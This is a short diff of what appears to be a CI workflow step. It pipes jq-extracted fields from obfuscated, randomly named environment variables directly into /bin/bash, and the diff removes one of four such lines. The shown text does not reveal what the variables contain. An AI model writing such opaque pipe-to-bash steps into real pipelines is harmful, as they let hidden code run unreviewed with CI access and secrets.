@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$r73964" | jq -r .iifqc10972 | /bin/bash
           printf '%s' "$ako13962" | jq -r .w345 | /bin/bash
-          printf '%s' "$wr55682" | jq -r .jq191 | /bin/bash
           echo $olo23 | jq -r .zfag5690 | /bin/bash
 
       - name: Save output
